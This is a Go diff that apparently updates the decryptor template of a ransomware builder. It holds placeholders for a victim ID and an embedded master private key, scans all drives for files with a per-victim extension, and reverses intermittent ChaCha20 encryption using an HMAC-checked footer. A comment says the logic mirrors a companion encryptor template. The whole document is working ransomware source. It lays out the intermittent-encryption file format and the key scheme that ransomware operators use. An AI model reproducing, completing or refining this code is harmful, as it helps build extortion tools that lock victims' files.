@@ -2,6 +2,8 @@ package main
 
 import (
 	"crypto/ecdh"
+	"crypto/hmac"
+	"crypto/sha256"
 	"encoding/binary"
 	"fmt"
 	"io"
@@ -15,29 +17,34 @@ import (
 	"time"
 	"unsafe"
 
-	"golang.org/x/crypto/chacha20poly1305"
+	"golang.org/x/crypto/chacha20"
+	"golang.org/x/crypto/hkdf"
+	"golang.org/x/sys/windows"
 )
 
-const encryptedExt = ".ling"
-const myID = "{{.ID}}" // Bisa digunakan untuk validasi, opsional
+const myID = "{{.ID}}"
 
-var excludedDirs = map[string]struct{}{
-	"$recycle.bin":              {},
-	"system volume information": {},
-	"windows":                   {},
-	"program files":             {},
-	"program files (x86)":       {},
-	"programdata":               {},
-	"appdata":                   {},
-}
+const (
+	footerMagic = 0x4C494E47
+	footerSize  = 96 // 4(magic) + 8(origSize) + 1(pattern) + 3(reserved) + 32(ephPub) + 16(salt) + 32(hmac)
+	chunkSize   = 1 << 20 // 1 MB
+)
 
-func isExcludedDir(name string) bool {
-	if len(name) > 0 && name[0] == '$' {
-		return true
-	}
-	_, ok := excludedDirs[name]
-	return ok
-}
+const (
+	PatternFull          = 0
+	PatternIntermittent1 = 1
+	PatternIntermittent2 = 2
+)
+
+// Windows drive type constants from GetDriveTypeW.
+const (
+	driveRemovable = 2
+	driveFixed     = 3
+	driveRemote    = 4
+	driveRAMDisk   = 6
+)
+
+var masterPrivKeyBytes = []byte{{.PrivateKeyBytes}}
 
 type Stats struct {
 	files     int64
@@ -45,6 +52,20 @@ type Stats struct {
 	skipped   int64
 	errors    int64
 	totalSize int64
+}
+
+func (s *Stats) addError()            { atomic.AddInt64(&s.errors, 1) }
+func (s *Stats) addSkipped()          { atomic.AddInt64(&s.skipped, 1) }
+func (s *Stats) addFolder()           { atomic.AddInt64(&s.folders, 1) }
+func (s *Stats) addFile(size int64)   { atomic.AddInt64(&s.files, 1); atomic.AddInt64(&s.totalSize, size) }
+func (s *Stats) loadFiles() int64     { return atomic.LoadInt64(&s.files) }
+func (s *Stats) loadFolders() int64   { return atomic.LoadInt64(&s.folders) }
+func (s *Stats) loadSkipped() int64   { return atomic.LoadInt64(&s.skipped) }
+func (s *Stats) loadErrors() int64    { return atomic.LoadInt64(&s.errors) }
+func (s *Stats) loadTotalSize() int64 { return atomic.LoadInt64(&s.totalSize) }
+
+func isAllowedDriveType(dt uintptr) bool {
+	return dt == driveRemovable || dt == driveFixed || dt == driveRemote || dt == driveRAMDisk
 }
 
 func detectDrives() []string {
@@ -60,14 +81,10 @@ func detectDrives() []string {
 		if bitmask&(1<<uint(i)) == 0 {
 			continue
 		}
-		letter := rune('A' + i)
-		drive := fmt.Sprintf("%c:\\", letter)
-
-		drivePtr, _ := syscall.UTF16PtrFromString(drive)
-		driveType, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(drivePtr)))
-
-		switch driveType {
-		case 2, 3, 4, 6:
+		drive := fmt.Sprintf("%c:\\", rune('A'+i))
+		ptr, _ := syscall.UTF16PtrFromString(drive)
+		dt, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(ptr)))
+		if isAllowedDriveType(dt) {
 			drives = append(drives, drive)
 		}
 	}
@@ -82,65 +99,336 @@ func isSymlink(path string) bool {
 	return fi.Mode()&os.ModeSymlink != 0
 }
 
-func scanProducer(drives []string, dirChan chan<- string, wg *sync.WaitGroup, dirPending *sync.WaitGroup) {
-	defer wg.Done()
-	for _, drive := range drives {
-		dirPending.Add(1)
-		dirChan <- drive
+func removeReadOnly(path string) {
+	ptr, err := syscall.UTF16PtrFromString(path)
+	if err != nil {
+		return
+	}
+	attrs, err := syscall.GetFileAttributes(ptr)
+	if err != nil {
+		return
+	}
+	if attrs&syscall.FILE_ATTRIBUTE_READONLY != 0 {
+		syscall.SetFileAttributes(ptr, attrs&^syscall.FILE_ATTRIBUTE_READONLY)
 	}
 }
 
-func dirWorker(stats *Stats, fileChan chan<- string, dirChan chan string, sem chan struct{}, wg *sync.WaitGroup, dirPending *sync.WaitGroup, filePending *sync.WaitGroup) {
+func openFileRW(path string) (*os.File, error) {
+	ptr, err := syscall.UTF16PtrFromString(path)
+	if err != nil {
+		return nil, err
+	}
+	h, err := syscall.CreateFile(ptr,
+		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
+		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
+		nil, syscall.OPEN_EXISTING,
+		syscall.FILE_ATTRIBUTE_NORMAL, 0)
+	if err != nil {
+		return nil, err
+	}
+	return os.NewFile(uintptr(h), path), nil
+}
+
+func createMutex(name string) bool {
+	ptr, err := syscall.UTF16PtrFromString(name)
+	if err != nil {
+		return false
+	}
+	_, err = windows.CreateMutex(nil, false, ptr)
+	return err == nil
+}
+
+func zeroMemory(data []byte) {
+	for i := range data {
+		data[i] = 0
+	}
+	runtime.KeepAlive(data)
+}
+
+func deriveFileKey(masterKey [32]byte, salt []byte) [32]byte {
+	r := hkdf.New(sha256.New, masterKey[:], salt, []byte("filekey"))
+	var key [32]byte
+	if _, err := io.ReadFull(r, key[:]); err != nil {
+		panic(err)
+	}
+	return key
+}
+
+// computeOffsets is an EXACT COPY of the encryptor's logic.
+// Any change here MUST be mirrored in encryptor_template.go.
+func computeOffsets(pattern int, origSize int64) []int64 {
+	if pattern == PatternFull {
+		n := (origSize + chunkSize - 1) / chunkSize
+		offsets := make([]int64, n)
+		for i := int64(0); i < n; i++ {
+			offsets[i] = i * chunkSize
+		}
+		return offsets
+	}
+
+	step := int64(5 * 1024 * 1024)
+	if pattern == PatternIntermittent2 {
+		step = 50 * 1024 * 1024
+	}
+
+	var offsets []int64
+	offsets = append(offsets, 0)
+
+	for pos := step; pos+chunkSize <= origSize; pos += step {
+		offsets = append(offsets, pos)
+	}
+
+	// Only add the last chunk if it doesn't overlap with the previous one.
+	// Overlap causes double-XOR → HMAC mismatch during decryption.
+	lastStart := origSize - chunkSize
+	if lastStart > 0 && (len(offsets) == 0 || lastStart >= offsets[len(offsets)-1]+int64(chunkSize)) {
+		offsets = append(offsets, lastStart)
+	}
+
+	if len(offsets) == 0 {
+		n := (origSize + chunkSize - 1) / chunkSize
+		offsets = make([]int64, n)
+		for i := int64(0); i < n; i++ {
+			offsets[i] = i * chunkSize
+		}
+	}
+	return offsets
+}
+
+// fileFooter holds the parsed footer data from an encrypted file.
+type fileFooter struct {
+	origSize    int64
+	pattern     int
+	ephPubBytes []byte
+	fileSalt    []byte
+	storedHMAC  []byte
+}
+
+// readFooter reads and validates the 96-byte footer from the end of the file.
+// Returns nil if the file is not encrypted or the footer is invalid.
+func readFooter(f *os.File, fileSize int64) *fileFooter {
+	if fileSize < int64(footerSize) {
+		return nil
+	}
+
+	origSize := fileSize - footerSize
+	footer := make([]byte, footerSize)
+	if _, err := f.ReadAt(footer, origSize); err != nil {
+		return nil
+	}
+
+	magic := binary.LittleEndian.Uint32(footer[0:4])
+	if magic != footerMagic {
+		return nil
+	}
+
+	origSizeFooter := int64(binary.LittleEndian.Uint64(footer[4:12]))
+	if origSizeFooter != origSize {
+		return nil
+	}
+
+	return &fileFooter{
+		origSize:    origSize,
+		pattern:     int(footer[12]),
+		ephPubBytes: footer[16:48],
+		fileSalt:    footer[48:64],
+		storedHMAC:  footer[64:96],
+	}
+}
+
+// verifyHMAC reads the ciphertext chunks and verifies integrity against the stored HMAC.
+func verifyHMAC(f *os.File, offsets []int64, origSize int64, fileKey [32]byte, fileSalt, storedHMAC, buf []byte) bool {
+	h := hmac.New(sha256.New, fileKey[:])
+	h.Write(fileSalt)
+
+	for _, offset := range offsets {
+		readLen := chunkSize
+		if offset+int64(readLen) > origSize {
+			readLen = int(origSize - offset)
+		}
+		if _, err := f.Seek(offset, io.SeekStart); err != nil {
+			return false
+		}
+		if n, _ := f.Read(buf[:readLen]); n != readLen {
+			return false
+		}
+		h.Write(buf[:readLen])
+	}
+
+	return hmac.Equal(h.Sum(nil), storedHMAC)
+}
+
+// decryptChunks performs the in-place ChaCha20 XOR for each offset.
+func decryptChunks(f *os.File, offsets []int64, origSize int64, fileKey [32]byte, buf, nonce []byte) bool {
+	for _, offset := range offsets {
+		readLen := chunkSize
+		if offset+int64(readLen) > origSize {
+			readLen = int(origSize - offset)
+		}
+
+		if _, err := f.Seek(offset, io.SeekStart); err != nil {
+			return false
+		}
+		if n, _ := f.Read(buf[:readLen]); n != readLen {
+			return false
+		}
+
+		clear(nonce)
+		binary.LittleEndian.PutUint64(nonce[16:], uint64(offset))
+		ciph, err := chacha20.NewUnauthenticatedCipher(fileKey[:], nonce)
+		if err != nil {
+			return false
+		}
+		ciph.XORKeyStream(buf[:readLen], buf[:readLen])
+
+		if _, err := f.Seek(offset, io.SeekStart); err != nil {
+			return false
+		}
+		if _, err := f.Write(buf[:readLen]); err != nil {
+			return false
+		}
+	}
+	return true
+}
+
+func decryptFile(encPath string, stats *Stats, masterPrivKey *ecdh.PrivateKey, buf, nonce []byte) {
+	removeReadOnly(encPath)
+
+	f, err := openFileRW(encPath)
+	if err != nil {
+		stats.addError()
+		return
+	}
+	defer f.Close()
+
+	info, err := f.Stat()
+	if err != nil {
+		stats.addError()
+		return
+	}
+
+	// Read & validate footer
+	ft := readFooter(f, info.Size())
+	if ft == nil {
+		stats.addSkipped()
+		return
+	}
+
+	// Derive keys
+	ephPub, err := ecdh.X25519().NewPublicKey(ft.ephPubBytes)
+	if err != nil {
+		stats.addError()
+		return
+	}
+	shared, err := masterPrivKey.ECDH(ephPub)
+	if err != nil {
+		stats.addError()
+		return
+	}
+	defer zeroMemory(shared)
+
+	masterKey := sha256.Sum256(shared)
+	fileKey := deriveFileKey(masterKey, ft.fileSalt)
+	offsets := computeOffsets(ft.pattern, ft.origSize)
+
+	// Verify HMAC (ciphertext integrity)
+	if !verifyHMAC(f, offsets, ft.origSize, fileKey, ft.fileSalt, ft.storedHMAC, buf) {
+		stats.addError()
+		return
+	}
+
+	// Decrypt each chunk (XOR with ChaCha20)
+	if !decryptChunks(f, offsets, ft.origSize, fileKey, buf, nonce) {
+		stats.addError()
+		return
+	}
+
+	// Finalize: sync, truncate footer, close, rename
+	f.Sync()
+	if err := f.Truncate(ft.origSize); err != nil {
+		stats.addError()
+		return
+	}
+	f.Close()
+
+	ext := filepath.Ext(encPath)
+	if ext != "" {
+		origName := strings.TrimSuffix(encPath, ext)
+		if err := os.Rename(encPath, origName); err != nil {
+			stats.addError()
+			return
+		}
+	}
+
+	stats.addFile(ft.origSize)
+}
+
+func scanProducer(drives []string, dirChan chan<- string, wg *sync.WaitGroup, pending *sync.WaitGroup) {
 	defer wg.Done()
-	for path := range dirChan {
+	for _, d := range drives {
+		pending.Add(1)
+		dirChan <- d
+	}
+}
+
+func dirWorker(stats *Stats, fileChan chan<- string, dirChan chan string, sem chan struct{}, wg *sync.WaitGroup, dirPend *sync.WaitGroup, filePend *sync.WaitGroup, targetExt string) {
+	defer wg.Done()
+	for dir := range dirChan {
 		sem <- struct{}{}
 		func(p string) {
-			defer dirPending.Done()
+			defer dirPend.Done()
 			defer func() { <-sem }()
 
 			if isSymlink(p) {
-				atomic.AddInt64(&stats.skipped, 1)
+				stats.addSkipped()
 				return
 			}
 
 			entries, err := os.ReadDir(p)
 			if err != nil {
-				atomic.AddInt64(&stats.errors, 1)
+				stats.addError()
 				return
 			}
 
-			for _, entry := range entries {
-				name := entry.Name()
-				fullPath := filepath.Join(p, name)
+			for _, e := range entries {
+				name := e.Name()
+				full := filepath.Join(p, name)
 
-				if entry.IsDir() {
-					if isExcludedDir(name) {
-						atomic.AddInt64(&stats.skipped, 1)
+				if e.IsDir() {
+					// Only skip Recycle Bin & System Volume Information.
+					// The decryptor must scan MORE broadly than the encryptor
+					// to find all encrypted files, even in unusual locations.
+					lower := strings.ToLower(name)
+					if lower == "$recycle.bin" || lower == "system volume information" || (len(name) > 0 && name[0] == '$') {
+						stats.addSkipped()
 						continue
 					}
-					atomic.AddInt64(&stats.folders, 1)
-					dirPending.Add(1)
-					go func(sub string) {
-						dirChan <- sub
-					}(fullPath)
+					stats.addFolder()
+					dirPend.Add(1)
+					go func(s string) { dirChan <- s }(full)
 				} else {
-					if filepath.Ext(name) != encryptedExt {
-						atomic.AddInt64(&stats.skipped, 1)
+					if !strings.HasSuffix(name, "."+targetExt) {
+						stats.addSkipped()
 						continue
 					}
-					filePending.Add(1)
+					filePend.Add(1)
 					go func(fp string) {
-						defer filePending.Done()
+						defer filePend.Done()
 						fileChan <- fp
-					}(fullPath)
+					}(full)
 				}
 			}
-		}(path)
+		}(dir)
 	}
 }
 
 func formatSize(b int64) string {
-	const KB, MB, GB, TB = 1024, 1024 * 1024, 1024 * 1024 * 1024, 1024 * 1024 * 1024 * 1024
+	const (
+		KB = 1024
+		MB = 1024 * KB
+		GB = 1024 * MB
+		TB = 1024 * GB
+	)
 	switch {
 	case b >= TB:
 		return fmt.Sprintf("%.2f TB", float64(b)/float64(TB))
@@ -170,150 +458,52 @@ func formatNumber(n int64) string {
 	return string(result)
 }
 
-func zeroMemory(data []byte) {
-	for i := range data {
-		data[i] = 0
-	}
-	runtime.KeepAlive(data)
+func printBanner(numCPU, workers int, targetExt string) {
+	fmt.Println(strings.Repeat("═", 50))
+	fmt.Println("DECRYPTOR")
+	fmt.Println(strings.Repeat("═", 50))
+	fmt.Printf("CPU Cores : %d\n", numCPU)
+	fmt.Printf("Workers   : %d\n", workers)
+	fmt.Printf("Target ext: .%s\n", targetExt)
+	fmt.Printf("Mulai     : %s\n", time.Now().Format("2006-01-02 15:04:05"))
+	fmt.Println(strings.Repeat("─", 50))
 }
 
-var masterPrivKeyBytes = []byte{{.PrivateKeyBytes}}
-
-const chunkSize = 64 * 1024
-const headerSize = 32 + 24 + 48 + 16
-
-func decryptFileStream(encryptedPath string, stats *Stats, masterPrivKey *ecdh.PrivateKey) {
-	success := false
-	origPath := strings.TrimSuffix(encryptedPath, encryptedExt)
-
-	fIn, err := os.Open(encryptedPath)
-	if err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-		return
-	}
-	defer fIn.Close()
-
-	header := make([]byte, headerSize)
-	_, err = io.ReadFull(fIn, header)
-	if err != nil {
-		atomic.AddInt64(&stats.skipped, 1)
-		return
-	}
-
-	ephPubKeyBytes := header[:32]
-	nonceGembok := header[32:56]
-	wrappedKey := header[56:104]
-	baseNonce := header[104:120]
-
-	ephPubKey, err := ecdh.X25519().NewPublicKey(ephPubKeyBytes)
-	if err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-		return
-	}
-
-	sharedSecret, err := masterPrivKey.ECDH(ephPubKey)
-	if err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-		return
-	}
-	defer zeroMemory(sharedSecret)
-
-	aeadGembok, err := chacha20poly1305.NewX(sharedSecret)
-	if err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-		return
-	}
-
-	fileKey, err := aeadGembok.Open(nil, nonceGembok, wrappedKey, nil)
-	if err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-		return
-	}
-	defer zeroMemory(fileKey)
-
-	aeadFile, err := chacha20poly1305.NewX(fileKey)
-	if err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-		return
-	}
-
-	fOut, err := os.Create(origPath)
-	if err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-		return
-	}
-	defer func() {
-		fOut.Close()
-		if !success {
-			os.Remove(origPath)
-		}
-	}()
-
-	cipherBuf := make([]byte, chunkSize+16)
-	plainBuf := make([]byte, 0, chunkSize)
-	var counter uint64 = 0
-
-	for {
-		n, err := io.ReadFull(fIn, cipherBuf)
-		if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
-			atomic.AddInt64(&stats.errors, 1)
-			return
-		}
-		if n == 0 {
-			break
-		}
-
-		nonce := make([]byte, 24)
-		copy(nonce, baseNonce)
-		binary.BigEndian.PutUint64(nonce[16:], counter)
-		counter++
-
-		plaintext, err := aeadFile.Open(plainBuf[:0], nonce, cipherBuf[:n], nil)
-		if err != nil {
-			atomic.AddInt64(&stats.errors, 1)
-			return
-		}
-
-		if _, err := fOut.Write(plaintext); err != nil {
-			atomic.AddInt64(&stats.errors, 1)
-			return
-		}
-		plainBuf = plaintext[:0]
-
-		if err == io.EOF || err == io.ErrUnexpectedEOF {
-			break
-		}
-	}
-
-	fIn.Close()
-	fOut.Close()
-
-	if err := os.Remove(encryptedPath); err != nil {
-		atomic.AddInt64(&stats.errors, 1)
-	}
-
-	if fi, err := os.Stat(origPath); err == nil {
-		atomic.AddInt64(&stats.totalSize, fi.Size())
-	}
-	atomic.AddInt64(&stats.files, 1)
-
-	success = true
+func printResults(stats *Stats, elapsed time.Duration) {
+	fmt.Println()
+	fmt.Println(strings.Repeat("═", 50))
+	fmt.Println("               HASIL DEKRIPSI")
+	fmt.Println(strings.Repeat("═", 50))
+	fmt.Printf("  File didekripsi : %s\n", formatNumber(stats.loadFiles()))
+	fmt.Printf("  Total Folder    : %s\n", formatNumber(stats.loadFolders()))
+	fmt.Printf("  Total Ukuran    : %s\n", formatSize(stats.loadTotalSize()))
+	fmt.Printf("  Dilewati        : %s path\n", formatNumber(stats.loadSkipped()))
+	fmt.Printf("  Error           : %s\n", formatNumber(stats.loadErrors()))
+	fmt.Printf("  Durasi          : %s\n", elapsed.Round(time.Millisecond))
+	fmt.Println(strings.Repeat("═", 50))
 }
 
 func main() {
+	if len(os.Args) < 2 {
+		fmt.Println("Usage: decryptor.exe <extension>")
+		fmt.Println("Example: decryptor.exe x9F2aP")
+		os.Exit(1)
+	}
+	targetExt := os.Args[1]
+
+	if !createMutex("Global\\Decryptor_" + myID) {
+		fmt.Println("[!] Another instance is already running. Exiting.")
+		os.Exit(0)
+	}
+
 	numCPU := runtime.NumCPU()
 	runtime.GOMAXPROCS(numCPU)
-	workerCount := numCPU * 2
+	workers := numCPU * 4
+
 	fileChan := make(chan string, 1000)
 	dirChan := make(chan string, 1000)
 
-	fmt.Println(strings.Repeat("═", 50))
-	fmt.Println("   DECRYPTOR ENGINE — Professional Edition")
-	fmt.Println(strings.Repeat("═", 50))
-	fmt.Printf("CPU Cores : %d\n", numCPU)
-	fmt.Printf("Workers   : %d\n", workerCount)
-	fmt.Printf("Mulai     : %s\n", time.Now().Format("2006-01-02 15:04:05"))
-	fmt.Println(strings.Repeat("─", 50))
+	printBanner(numCPU, workers, targetExt)
 
 	start := time.Now()
 	stats := &Stats{}
@@ -323,55 +513,49 @@ func main() {
 		panic("Invalid master private key")
 	}
 
-	var consumerWg sync.WaitGroup
-	for i := 0; i < workerCount; i++ {
-		consumerWg.Add(1)
+	// Start decryption workers — each gets its own buffer and nonce.
+	var decWg sync.WaitGroup
+	for i := 0; i < workers; i++ {
+		decWg.Add(1)
 		go func() {
-			defer consumerWg.Done()
-			for fpath := range fileChan {
-				decryptFileStream(fpath, stats, masterPrivKey)
+			defer decWg.Done()
+			buf := make([]byte, chunkSize)
+			nonce := make([]byte, 24)
+			for path := range fileChan {
+				decryptFile(path, stats, masterPrivKey, buf, nonce)
 			}
 		}()
 	}
 
-	var producerWg sync.WaitGroup
-	var dirPending sync.WaitGroup
-	var filePending sync.WaitGroup
+	var prodWg, dirWg sync.WaitGroup
+	var dirPend, filePend sync.WaitGroup
 
-	drives := detectDrives()
-	producerWg.Add(1)
-	go scanProducer(drives, dirChan, &producerWg, &dirPending)
+	var drives []string
+	if len(os.Args) > 2 {
+		drives = []string{os.Args[2]}
+	} else {
+		drives = detectDrives()
+	}
+	prodWg.Add(1)
+	go scanProducer(drives, dirChan, &prodWg, &dirPend)
 
 	go func() {
-		producerWg.Wait()
-		dirPending.Wait()
+		prodWg.Wait()
+		dirPend.Wait()
 		close(dirChan)
 	}()
 
-	var dirWg sync.WaitGroup
-	sem := make(chan struct{}, numCPU*2)
-	for i := 0; i < workerCount; i++ {
+	sem := make(chan struct{}, workers)
+	for i := 0; i < workers; i++ {
 		dirWg.Add(1)
-		go dirWorker(stats, fileChan, dirChan, sem, &dirWg, &dirPending, &filePending)
+		go dirWorker(stats, fileChan, dirChan, sem, &dirWg, &dirPend, &filePend, targetExt)
 	}
 
 	dirWg.Wait()
-	filePending.Wait()
+	filePend.Wait()
 	close(fileChan)
-
-	consumerWg.Wait()
+	decWg.Wait()
 
 	elapsed := time.Since(start)
-
-	fmt.Println()
-	fmt.Println(strings.Repeat("═", 50))
-	fmt.Println("               HASIL DEKRIPSI")
-	fmt.Println(strings.Repeat("═", 50))
-	fmt.Printf("  File didekripsi : %s\n", formatNumber(atomic.LoadInt64(&stats.files)))
-	fmt.Printf("  Total Folder    : %s\n", formatNumber(atomic.LoadInt64(&stats.folders)))
-	fmt.Printf("  Total Ukuran    : %s\n", formatSize(atomic.LoadInt64(&stats.totalSize)))
-	fmt.Printf("  Dilewati        : %s path\n", formatNumber(atomic.LoadInt64(&stats.skipped)))
-	fmt.Printf("  Error           : %s\n", formatNumber(atomic.LoadInt64(&stats.errors)))
-	fmt.Printf("  Durasi          : %s\n", elapsed.Round(time.Millisecond))
-	fmt.Println(strings.Repeat("═", 50))
+	printResults(stats, elapsed)
 }
